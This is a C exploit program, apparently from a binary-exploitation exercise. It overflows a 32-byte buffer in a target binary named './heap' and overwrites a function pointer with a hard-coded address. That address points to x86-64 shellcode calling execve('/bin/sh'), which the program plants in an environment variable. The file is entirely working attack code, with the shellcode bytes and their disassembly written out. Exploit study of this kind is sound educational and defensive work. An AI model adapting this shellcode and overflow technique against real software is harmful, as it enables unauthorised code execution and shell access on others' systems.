#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include <string.h>

#define BUFSIZE 0x20
//#define EGGLOC 0x5555555592a0
#define EGGLOC 0x7fffffffefd0
int main(int argc, char* argv[]) {
  // neat shellcode
  char shellcode[] =
    "EGG="
    "\x48\x31\xd2"     // xor    %rdx, %rdx
    "\x52"             // push   %rdx
    "\x58"             // pop    %rax
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" 
                       // mov $0x68732f6e69622f2f, %rbx ("//bin/sh")
    "\x48\xc1\xeb\x08" // shr    $0x8, %rbx
    "\x53"             // push   %rbx
    "\x48\x89\xe7"     // mov    %rsp, %rdi
    "\x50"             // push   %rax
    "\x57"             // push   %rdi
    "\x48\x89\xe6"     // mov    %rsp, %rsi
    "\xb0\x3b"         // mov    $0x3b, %al
    "\x0f\x05";        // syscall

  // buffer used for overflow
  char buf[256];
  
  memcpy(buf, shellcode, sizeof(shellcode)-1);
  // fill buffer with 0x41's
  //for (int i = sizeof(shellcode)-1; i < BUFSIZE; buf[i++] = 'A');
  for (int i = 0; i < BUFSIZE; buf[i++] = 'A');

  // overwrite fctptr with eggloc
  char **buff = (char**)(&buf[BUFSIZE]);
  *(buff) = (void*)EGGLOC;

  // setup execution environment and fire exploit
  char *args[3] = { "./heap", buf, NULL };
  char *envp[2] = { shellcode, NULL}; 
  execve("./heap", args, envp);
  return 0;
} 
